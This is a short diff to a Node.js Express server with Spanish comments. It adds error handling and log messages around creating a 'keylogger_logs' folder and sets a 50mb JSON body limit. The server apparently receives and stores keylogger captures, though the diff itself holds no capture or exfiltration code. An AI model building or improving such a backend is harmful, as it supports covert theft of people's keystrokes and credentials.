@@ -17,8 +17,13 @@ server.listen(PORT, () => {
 
 // --- CONFIGURACIÓN DE CARPETAS ---
 const keyloggerSaveDir = path.join(__dirname, 'keylogger_logs');
-if (!fs.existsSync(keyloggerSaveDir)) {
-    fs.mkdirSync(keyloggerSaveDir, { recursive: true });
+try {
+    if (!fs.existsSync(keyloggerSaveDir)) {
+        fs.mkdirSync(keyloggerSaveDir, { recursive: true });
+        console.log("Carpeta de logs creada exitosamente");
+    }
+} catch (err) {
+    console.error("Error al crear carpeta de logs, usando directorio temporal:", err);
 }
 
 app.use(express.json({ limit: '50mb' }));
